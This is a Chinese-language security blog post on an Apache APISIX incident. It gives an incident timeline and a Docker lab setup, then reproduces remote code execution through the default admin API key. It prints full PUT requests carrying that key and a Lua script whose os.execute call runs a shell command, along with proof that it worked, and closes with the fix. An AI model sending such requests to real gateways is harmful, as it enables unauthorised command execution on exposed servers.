0x00 APISIX及风险介绍

APISIX是一个动态, 实时, 高性能的API网关. 

A dynamic, real-time, high-performance API gateway.

腾讯蓝军在一篇文章中提到（见参考文档3）, apisix的默认token存在RCE漏洞风险, 正好公司内部HIDS检测发现一起命令执行事件, 投递告警, 故搭建环境复现。

0x01 应急事件
0

简述一下这起应急事件, 以下为时间线.

  • 2021-11-16 17:18:12 内部扫描工具发现漏洞, 业务使用了apisix的默认Token

  • 2021-11-16 17:30:15 内部扫描工具自动提单给业务处理，业务未进行处理

  • 2021-11-17 10:40:22 HIDS发现业务机器上有dig命令, 疑似被攻击者入侵，经确认攻击者利用了apisix的RCE漏洞, 于是进行应急, 应急流程如下:

在应急过程中, 定位到apisix利用需要用到PUT操作, 定位到第一条PUT请求于10:27发起,
反查对应的请求头, 发现最早的请求时间为09:42, 其创建了services/1002, routers/1100等,
应急时业务已删除对应的routers, 未能定位到具体的lua内容.
通过 find 查找时间段09:00 - 11:00内新增加的文件, 未发现新增文件;
查看ps, netstat, crontab等目录及进程, 未发现异常;
在内部扫描工具中对该内部其他apisix业务的历史漏洞进行复核并提单处理.

  • 2021-11-17 11:00:12 业务修改Token, 漏洞修复, 内部扫描工具复测修复完成

  • 2021-11-17 11:10:40 开启apisix漏洞的告警, 将外网的漏洞通过API接口提交至IM工具,以进行快速响应


0x02 APISIX环境搭建及简单用法

搭建过程

这里使用docker进行搭建

  • clone 项目

    git clone https://github.com/apache/apisix-docker.git

  • 安装docker-compose

    pip install docker-compose

  • 启用apisix. 注意的是在测试过程中, 应该是docker或者系统未开启ip_forward, 导致虽然绑定了0.0.0.0:9080但是不能外网访问. 这里使用了ew进行转发至19080

    docker-compose -p docker-apisix up -d
    #转发端口转19080
    ./ew_for_linux -s lcx_tran -l 19080 -f 127.0.0.1 -g 9080

  • 本地访问9080或者访问IP的19080端口即可

简单用法

根据apisix-docker下的latest/example.md文件, 可知有如下方法

  • 创建service

    PUT /apisix/admin/services/1 HTTP/1.1
      Host: 172.16.234.213:19080
      User-Agent: curl/7.79.1
      Accept: */*
      X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
      Content-Length: 125
      Content-Type: application/json
      Connection: close

      {
          "upstream": {
              "type": "roundrobin",
              "nodes": {
                  "172.18.5.13:80": 1
              }
          }
      }

  • 创建routes并绑定至对应的service上

    PUT /apisix/admin/routes/12 HTTP/1.1
      Host: 172.16.234.213:19080
      User-Agent: curl/7.79.1
      Accept: */*
      X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
      Content-Length: 73
      Content-Type: application/json
      Connection: close

      {
          "uri": "/*",
          "host": "web1.lvh.me",
          "service_id": "1"
      }

    这时就可以进行访问, lvh.me是解析到127.0.0.1的一个域名, 直接在本地访问即可, 此处返回502原因是配置了upstream, 不影响测试结果.

    curl web1.lvh.me:9080/hello
      <html>
      <head><title>502 Bad Gateway</title></head>
      <body>
      <center><h1>502 Bad Gateway</h1></center>
      <hr><center>openresty</center>
      </body>
      </html>


0x03 APISIX漏洞利用

根据参考中route和script的内容, 可以知道在创建route的同时, 参数是包含了script属性，详见参考文档1和参考文档2.

尤其在script文档里, 重点提了一句话

In theory, you can write arbitrary Lua code in Script, or you can directly call existing plugins to reuse existing code.

也就是说script是可以支持lua脚本的. 最简单的一种办法是直接在参考里修改

  • 原始的tmp目录

    bash-5.1# ls /tmp/
        disk_cache_one         pwd-from-apisix-admin

  • 创建带script的route

    PUT /apisix/admin/routes/52 HTTP/1.1
    Host: 172.16.234.213:19080
    User-Agent: curl/7.79.1
    Accept: */*
    X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
    Content-Length: 250
    Content-Type: application/json
    Connection: close

    {
        "uri": "/*",
        "host": "web5.lvh.me",
        "service_id": "1",
        "script": "local _M = {} \n function _M.access(api_ctx) \n ngx.log(ngx.INFO,\"hit access phase\") \n os.execute(\"touch /tmp/pwd-from-apisix-admin-2\")\n end \nreturn _M"
    }`

  • 在本地请求web5.lvh.me:9080/hello

    curl web5.lvh.me:9080/hello
    <html>
    <head><title>502 Bad Gateway</title></head>
    <body>
    <center><h1>502 Bad Gateway</h1></center>
    <hr><center>openresty</center>
    </body>
    </html>

  • 重新查看docker内的tmp目录

    bash-5.1# ls /tmp/
    disk_cache_one           pwd-from-apisix-admin    pwd-from-apisix-admin-2

  • 可见在PUT请求中的os.execute()命令已经成功执行了


0x04 防护

不要使用默认的admin_key, 修改config.yaml文件中的admin_key属性并重启服务.
